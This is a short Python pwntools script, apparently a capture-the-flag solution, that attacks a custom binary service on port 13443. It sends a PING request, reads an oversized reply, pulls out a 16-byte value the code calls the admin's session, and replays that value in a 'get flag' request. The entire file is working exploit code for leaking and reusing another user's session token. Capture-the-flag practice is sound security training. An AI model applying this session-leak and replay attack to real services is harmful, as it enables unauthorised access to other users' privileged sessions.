#!/usr/bin/python3
from pwn import *
context.log_level='debug'
context.arch='amd64'
#context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p=remote('0.0.0.0', 13443)
ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)
# gdb.attach(p)

req = b'\x01\x01' # version and menu (ping)
req += b'A'*16 # sess
req += b'\x04\x00' # size
req += b'PING'

sl(req)

res = p.recv(0x404)

sess = res[8:24]

get_flag = b'\x01\x06'
get_flag += sess # admin's session
get_flag += b'\x04\x00'

sl(get_flag)

p.interactive()
